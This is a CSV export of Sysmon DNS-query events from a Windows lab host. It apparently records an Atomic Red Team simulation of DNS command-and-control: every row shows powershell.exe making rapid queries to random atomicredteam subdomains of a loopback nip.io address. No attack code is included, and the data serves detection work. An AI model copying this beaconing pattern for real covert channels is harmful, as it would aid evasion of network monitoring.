"2025-12-22 13:58:44.033 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165973,"Query: atomicredteam-9930.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.093","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.034 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165974,"Query: atomicredteam-309003.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.137","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.034 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165975,"Query: atomicredteam-939287.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.179","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.034 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165976,"Query: atomicredteam-680688.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.223","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.035 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165977,"Query: atomicredteam-309803.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.266","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.035 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165978,"Query: atomicredteam-31046.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.310","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.035 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165979,"Query: atomicredteam-164428.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.354","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.035 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165980,"Query: atomicredteam-416918.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.525","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.035 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165981,"Query: atomicredteam-228193.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.567","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.035 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165982,"Query: atomicredteam-564800.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.610","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.035 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165983,"Query: atomicredteam-254724.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.653","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.036 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165984,"Query: atomicredteam-825077.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.697","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.036 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165985,"Query: atomicredteam-14237.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.740","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:44.036 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165986,"Query: atomicredteam-934994.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.783","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:45.041 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165987,"Query: atomicredteam-930998.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:43.826","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:45.041 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165988,"Query: atomicredteam-296166.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:44.146","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:45.042 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165989,"Query: atomicredteam-82933.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:44.467","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:45.042 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165990,"Query: atomicredteam-219819.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:44.511","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:45.042 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165991,"Query: atomicredteam-1285.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:44.682","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:45.042 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165992,"Query: atomicredteam-618349.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:44.725","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:45.042 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165993,"Query: atomicredteam-981904.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:44.767","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:45.043 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165994,"Query: atomicredteam-750587.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:44.810","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:45.043 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165995,"Query: atomicredteam-938839.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:44.983","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:46.045 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165996,"Query: atomicredteam-2641.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:45.027","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:46.045 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165997,"Query: atomicredteam-634641.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:45.347","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:46.046 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165998,"Query: atomicredteam-157123.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:45.390","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:46.046 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165999,"Query: atomicredteam-461268.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:45.710","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:46.046 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166000,"Query: atomicredteam-155654.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:45.753","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:46.046 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166001,"Query: atomicredteam-385922.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:45.796","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:46.046 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166002,"Query: atomicredteam-849353.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:45.840","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:46.047 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166003,"Query: atomicredteam-313691.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:45.885","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:47.049 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166004,"Query: atomicredteam-53101.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:46.205","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:47.049 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166005,"Query: atomicredteam-54791.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:46.248","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:47.049 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166006,"Query: atomicredteam-777206.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:46.567","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:47.049 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166007,"Query: atomicredteam-372750.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:46.610","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:47.049 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166008,"Query: atomicredteam-691729.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:46.653","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:47.050 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166009,"Query: atomicredteam-941551.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:46.971","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:48.055 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166010,"Query: atomicredteam-449980.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:47.011","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:48.055 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166011,"Query: atomicredteam-735914.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:47.051","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:48.055 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166012,"Query: atomicredteam-129055.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:47.094","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:48.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166013,"Query: atomicredteam-804320.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:47.266","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:48.056 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166014,"Query: atomicredteam-626031.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:47.587","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.060 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166015,"Query: atomicredteam-153984.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:47.631","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.061 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166016,"Query: atomicredteam-725994.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:47.674","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.061 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166017,"Query: atomicredteam-919795.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:47.718","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.061 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166018,"Query: atomicredteam-677632.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.037","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.061 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166019,"Query: atomicredteam-317778.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.082","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.061 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166020,"Query: atomicredteam-551890.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.126","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:49.061 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166021,"Query: atomicredteam-589184.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:48.170","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
